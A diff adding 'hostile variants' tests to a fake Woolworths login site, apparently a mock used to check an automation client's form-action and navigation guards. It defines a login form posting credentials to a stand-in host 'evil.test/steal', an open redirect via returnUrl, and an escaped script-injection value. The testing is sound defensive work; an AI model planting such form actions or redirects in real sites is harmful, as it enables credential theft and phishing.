@@ -354,6 +354,87 @@ describe('2FA', () => {
   })
 })
 
+describe('hostile variants', () => {
+  it('can make the login form post somewhere else, for the form-action guard', async () => {
+    const site = await startFakeWoolworths({
+      accounts: [PLAIN],
+      hostile: { loginFormAction: 'https://evil.test:4443/steal' },
+    })
+    sites.push(site)
+    const page = await new Client(site.origin).get('/shop/securelogin')
+    expect(page.text).toContain('<form id="loginForm" method="post" action="https://evil.test:4443/steal">')
+    // The real endpoint still works, so a test can tell "blocked" from "broken".
+    const client = await browsing(site)
+    await client.postForm('/auth/login', { email: PLAIN.username, password: PLAIN.password })
+    expect((await shopper(client)).IsLoggedIn).toBe(true)
+  })
+
+  it('escapes a hostile form action rather than breaking out of the attribute', async () => {
+    const site = await startFakeWoolworths({ hostile: { loginFormAction: '"><script>x</script>' } })
+    sites.push(site)
+    const page = await new Client(site.origin).get('/shop/securelogin')
+    expect(page.text).toContain('action="&quot;&gt;&lt;script&gt;x&lt;/script&gt;"')
+  })
+
+  it('keeps the hostile form action when re-rendering after a wrong password', async () => {
+    const site = await startFakeWoolworths({
+      accounts: [PLAIN],
+      hostile: { loginFormAction: 'https://evil.test/' },
+    })
+    sites.push(site)
+    const client = await browsing(site)
+    const reply = await client.postForm('/auth/login', { email: PLAIN.username, password: 'wrong' })
+    expect(reply.text).toContain('action="https://evil.test/"')
+  })
+
+  it('can redirect off-site after login via returnUrl, for the navigation guard', async () => {
+    const site = await startFakeWoolworths({ accounts: [PLAIN], hostile: { openRedirectAfterLogin: true } })
+    sites.push(site)
+    const client = await browsing(site)
+    const page = await client.get('/shop/securelogin?returnUrl=https%3A%2F%2Fevil.test%2Flanded')
+    expect(page.text).toContain('action="/auth/login?returnUrl=https%3A%2F%2Fevil.test%2Flanded"')
+    const reply = await client.postForm('/auth/login?returnUrl=https%3A%2F%2Fevil.test%2Flanded', {
+      email: PLAIN.username,
+      password: PLAIN.password,
+    })
+    expect(reply.status).toBe(302)
+    expect(reply.headers.get('location')).toBe('https://evil.test/landed')
+  })
+
+  it('keeps returnUrl on the form when re-rendering after a wrong password', async () => {
+    const site = await startFakeWoolworths({ accounts: [PLAIN], hostile: { openRedirectAfterLogin: true } })
+    sites.push(site)
+    const client = await browsing(site)
+    const reply = await client.postForm('/auth/login?returnUrl=%2Fx', {
+      email: PLAIN.username,
+      password: 'no',
+    })
+    expect(reply.text).toContain('action="/auth/login?returnUrl=%2Fx"')
+  })
+
+  it('falls back to the account page when the open-redirect variant gets no returnUrl', async () => {
+    const site = await startFakeWoolworths({ accounts: [PLAIN], hostile: { openRedirectAfterLogin: true } })
+    sites.push(site)
+    const client = await browsing(site)
+    const page = await client.get('/shop/securelogin')
+    expect(page.text).toContain('action="/auth/login"')
+    const reply = await client.postForm('/auth/login', { email: PLAIN.username, password: PLAIN.password })
+    expect(reply.headers.get('location')).toBe('/shop/myaccount')
+  })
+
+  it('ignores returnUrl entirely unless the variant is on', async () => {
+    const site = await start()
+    const client = await browsing(site)
+    const page = await client.get('/shop/securelogin?returnUrl=https%3A%2F%2Fevil.test%2F')
+    expect(page.text).toContain('<form id="loginForm" method="post" action="/auth/login">')
+    const reply = await client.postForm('/auth/login?returnUrl=https%3A%2F%2Fevil.test%2F', {
+      email: PLAIN.username,
+      password: PLAIN.password,
+    })
+    expect(reply.headers.get('location')).toBe('/shop/myaccount')
+  })
+})
+
 describe('default first name', () => {
   it('is Shopper when an account has none', async () => {
     const site = await startFakeWoolworths({ accounts: [{ username: 'a@example.test', password: 'p' }] })
